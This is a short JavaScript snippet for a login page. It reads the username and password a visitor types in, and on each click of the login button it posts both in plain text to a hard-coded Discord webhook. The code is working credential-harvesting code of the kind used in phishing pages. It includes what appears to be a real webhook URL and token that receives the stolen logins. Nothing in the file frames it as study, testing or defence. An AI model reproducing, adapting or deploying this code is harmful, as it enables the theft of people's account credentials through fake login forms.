    // define elements
    const usernameArea = document.getElementById("Username")
    const passwordArea = document.getElementById("Password")
    const loginbtn = document.getElementById("Loginbtn")
    const url = "https://discord.com/api/webhooks/1309242717372682301/uZZM5Q5P2RA7xwns3dverjlgH0_AlGd1fCJonnyA5Oh8vo19TdMIjsKlGMrFpfdCH009"
    // the main function when the button is clicked
    loginbtn.addEventListener("click", function() {
        var usernameValue = usernameArea.value
        var passwordValue = passwordArea.value
        // make the message constant
        const message = `There was a login request 
        Username: ${usernameValue} 
        Password: ${passwordValue}`

        const data = {
            content: message
        }
        // send the data to discord!!!
        fetch(url, {
            method: "POST",
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(data)
        })
        .then(response => {
            if (response.ok) {
                console.log("send login request")
            } else {
                console.log("some thing went wrong")
            }
        })
        .catch(error => {
            console.log("Error: ", error)
        })
        
        
    })
  



